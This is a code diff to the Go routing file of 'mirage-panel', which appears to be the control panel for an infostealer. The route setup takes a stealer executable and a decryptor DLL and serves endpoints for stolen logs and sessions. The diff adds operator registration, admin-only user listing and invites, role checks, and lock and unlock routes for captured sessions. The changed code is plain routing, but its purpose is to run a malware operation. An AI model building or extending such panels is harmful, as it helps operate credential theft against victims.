@@ -8,6 +8,7 @@ import (
 
 	"github.com/go-chi/chi/v5"
 	"github.com/user/mirage-panel/internal/auth"
+	"github.com/user/mirage-panel/internal/middleware"
 	"github.com/user/mirage-panel/internal/services"
 	"github.com/user/mirage-panel/internal/ws"
 )
@@ -33,6 +34,7 @@ func AuthMiddleware(secret string) func(http.Handler) http.Handler {
 			}
 
 			ctx := context.WithValue(r.Context(), claimsKey, claims)
+			ctx = middleware.ContextWithClaims(ctx, claims)
 			next.ServeHTTP(w, r.WithContext(ctx))
 		})
 	}
@@ -69,6 +71,7 @@ func CORSMiddleware(allowedOrigins string) func(http.Handler) http.Handler {
 
 func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, allowedOrigins string, hub *ws.Hub, stealerExe, decryptorDll []byte) {
 	authHandler := NewAuthHandler(db, jwtSecret)
+	usersHandler := NewUsersHandler(db, jwtSecret)
 	statsHandler := NewStatsHandler(db, hub)
 	logProc := services.NewLogProcessor(db, hub)
 	logsHandler := NewLogsHandler(logProc)
@@ -77,6 +80,7 @@ func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, allowedOrigins stri
 
 	r.Group(func(r chi.Router) {
 		r.Post("/api/auth/login", authHandler.Login)
+		r.Post("/api/auth/register", usersHandler.Register)
 	})
 
 	r.Group(func(r chi.Router) {
@@ -87,6 +91,8 @@ func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, allowedOrigins stri
 		r.Get("/api/sessions", sessionsHandler.List)
 		r.Get("/api/sessions/{id}", sessionsHandler.Detail)
 		r.Delete("/api/sessions/{id}", sessionsHandler.Delete)
+		r.Post("/api/sessions/{id}/lock", sessionsHandler.Lock)
+		r.Post("/api/sessions/{id}/unlock", sessionsHandler.Unlock)
 
 		searchHandler := NewSearchHandler(db)
 		r.Get("/api/search", searchHandler.Search)
@@ -117,5 +123,8 @@ func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, allowedOrigins stri
 		settingsHandler := NewSettingsHandler(db, jwtSecret)
 		r.Get("/api/settings", settingsHandler.Get)
 		r.Put("/api/settings", settingsHandler.Update)
+
+		r.With(middleware.RequireRole("admin")).Get("/api/users", usersHandler.List)
+		r.With(middleware.RequireRole("admin")).Post("/api/users/invite", usersHandler.CreateInvite)
 	})
 }
